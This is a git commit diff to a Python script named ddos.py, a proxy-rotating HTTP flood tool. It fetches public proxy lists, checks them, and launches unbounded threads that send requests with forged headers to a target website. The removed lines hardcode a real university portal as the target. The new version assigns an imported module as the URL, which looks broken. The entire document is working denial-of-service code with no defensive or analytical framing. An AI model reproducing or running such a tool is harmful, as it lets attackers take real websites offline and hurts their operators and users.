d18b210555c59cbe5d8836d0c86a1f44b74c9db8
Vllad <40424029+Gametz@users.noreply.github.com>
2022-03-10 07:23:51 +0300

    1.2.2

--- ddos.py
+++ ddos.py
@@ -1,14 +1,10 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-
-import click
 import os
 import random
 import requests as r
 import threading
-from colorama import Fore, Style, Back
 from fake_headers import Headers
-
 import targetdos as td
 
 def clear():
@@ -31,7 +27,6 @@ def check(ip, prox, url):
 	except:
 		ipx = ip
 	if ip != ipx:
-		print(Fore.BLACK+Back.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
@@ -39,16 +34,14 @@ def check(ip, prox, url):
 
 def ddos(prox, url):
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
-	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
 		thread_list = []
-		t = threading.Thread (target=start_ddos, args=(url, headers, proxies, color))
+		t = threading.Thread (target=start_ddos, args=(url, headers, proxies))
 		thread_list.append(t)
 		t.start()
 
-def start_ddos(url, headers, proxies, color):
+def start_ddos(url, headers, proxies):
 	try:
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
@@ -59,28 +52,13 @@ def start_ddos(url, headers, proxies, color):
 	except:
 		pass
 
-@click.command()
-@click.option('--proxy', '-p', help="File with a proxy")
-@click.option('--url', '-u', help="URL")
-def main(proxy, url):
+def main():
 	clear()
-	url = "https://portal.mfua.ru/"
-	if url[:4] != "http":
-		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
-		exit()
-	if proxy == None:
-		while True:
-			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
-			array = req.text.split()
-			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
-			check_prox(array, url)
-	else:
-		try:
-			fx = open(proxy)
-			array = fx.read().split()
-			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
-			check_prox(array, url)
-		except FileNotFoundError:
-			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
-			exit()
+	url = td
+	while True:
+		req = r.get("https://api.proxyscrape.com/?request=displayproxies")
+		array = req.text.split()
+		print("Found {} new proxies".format(len(array)))
+		check_prox(array, url)
+
 main()
